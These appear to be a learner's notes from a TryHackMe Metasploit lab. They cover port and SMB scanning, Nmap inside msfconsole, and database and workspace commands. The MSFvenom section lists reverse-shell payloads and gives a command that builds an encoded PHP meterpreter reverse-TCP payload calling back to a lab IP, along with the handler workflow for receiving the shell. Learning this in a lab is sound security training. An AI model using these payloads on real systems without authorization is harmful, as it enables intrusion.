# Metasploit: Exploitation (TryHackMe - Cyber Security 101)
**Platform:** TryHackMe (Cyber Security 101 path)  
**VM / Lab:** Browser modules  
**Time spent:** 20 min

## Objective
Using Metasploit for scanning, vulnerability assessment and exploitation.

## Core Concepts Covered
1. Network Scanning with Metasploit
    - **Port Scanning Modules**
        * Metasploit includes several auxiliary scanner modules for port scanning:
            * `auxiliary/scanner/portscan/ack`: TCP ACK Port Scanner
            * `auxiliary/scanner/portscan/syn`: TCP SYN Port Scanner
            * `auxiliary/scanner/portscan/tcp`: Full TCP Connect Scan
            * `auxiliary/scanner/portscan/xmas`: TCP Xmas Scan
            * `auxiliary/scanner/sap/sap_router_portscanner`: SAP-specific port scanner
        * Use `search portscan` in `msfconsole` to list available port scanning modules.
        * [Example of port scanning in metasploit](images/port_scanning.jpg)
    - **TCP Port Scanner Options**
        * When using `auxiliary/scanner/portscan/tcp`, you can configure:
            * `RHOSTS`: Target IP(s) or range
            * `PORTS`: Port range to scan (default: 1–10000)
            * `THREADS`: Number of concurrent threads
            * `TIMEOUT`: Socket connect timeout (in seconds)
        * Higher thread count is good for faster scans, but may cause network noise.
        * [Example of tcp port scanning module](images/tcp_scan.jpg)
2. Nmap Integration in Metasploit
    - You can run Nmap directly from `msfconsole`:
        * `nmap -p 80-443 <target_IP>`
    - Nmap is useful for initial reconnaissance before launching exploits.
    - Nmap can be used to detect open ports and services in the target machine.
    - [Example of nmap scanning](images/nmap_scanning.jpg)
3. SMB Scanning with Metasploit
    - Use module `scanner/smb/smb_version`
    - Used to identify SMB version and OS details of target systems.
    - [Sample output included here.](images/smb_scanning.jpg)
4. Metasploit Database
    - **Starting PostgreSQL & Initializing Metasploit DB**
        * Use command: `systemctl start postgresql` `msfdb init`
        * Initializes the Metasploit database and web service
        * If already initialized, reset with: `sudo -u postgres msfdb delete`
        * [Example of starting db](images/system_sql.jpg)
    - **Checking DB connections**
        * Use command: `db_status`
        * This is used to check database connection.
        * [Example of db_status](images/db_status.jpg)
    - **Workspace Management in Metasploit**
        * **Listing Workspace**
            * Use command `workspace`
            * Shows current and available workspaces
            * [Example of workspaces](images/db_workspace.jpg)
        * **Adding a Workspace**
            * Use command: `workspace -a <workspace_name>`
            * Adds a new workspace to the DB
            * [Example of adding workspace](images/workspace_add.jpg)
        * **Switching Workspaces**
            * Use command: `workspace <workspace_name>`
            * Switch to any created workspaces
        * **Workspace Help Menu**
            * Use command: `workspace -h`
            * Bring up the help menu
            * [Example of workspace help command](images/workspace_help.jpg)
    - **Database Backend Commands**
        * `db_nmap`: Run Nmap and save results to DB
        * `db_import`: Import scan results
        * `db_export`: Export DB contents
        * `hosts`: List discovered hosts
        * `services`: List discovered services
        * `vulns`: Show known vulnerabilities
        * `creds`: List credentials
        * `loot`: List captured files
        * `notes`: List analyst notes
5. MSFvenom
    - MSFvenom is a powerful tool for generating payloads in Metasploit.
    - Supports multiple platforms: Windows, Linux, Android, PHP, Python, ASP, iOS, etc.
    - Can output payloads in various formats and apply encoders.
    - **Listing Payloads**
        * Use command: `msfvenom -l payloads`
        * Shows all available payloads (562+)
        * Examples:
            * `cmd/unix/reverse_python`
            * `android/meterpreter/reverse_tcp`
            * `windows/shell/reverse_tcp`
            * `php/meterpreter/reverse_tcp`
            * `apple_ios/aarch64/meterpreter_reverse_http`
    - **Output Formats**
        * Use command: `msfvenom --list formats`
        * Comman formats are: `exe`, `elf`, `asp`, `raw`, `py`, `php`, `psh`, `bash`, `c`, `js`, `vb`, `war`, `dll`
    - **Encoders in MSFvenom**
        * Used to transform payloads, not guaranteed to bypass antivirus
        * Helpful for injection into shellcode or avoiding bad characters
        * Example command: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f raw -e php/base64`
    - **Using Handlers in Metasploit**
        * **Workflow for Reverse Shell**
            1. Generate payload with MSFvenom
            2. Start handler in Metasploit: `exploit/multi/handler`
            3. Trigger payload on target (eg, upload and execute `reverse_shell.php`).
            4. Receive shell in Metasploit

## Learning and Reflection
- Learned about networking scan with metasploit.
- Learned how to use nmap with msfconsole.
- Learned about creating databases in metasploit.
- Learned about MSFVenom and using it to create payloads.














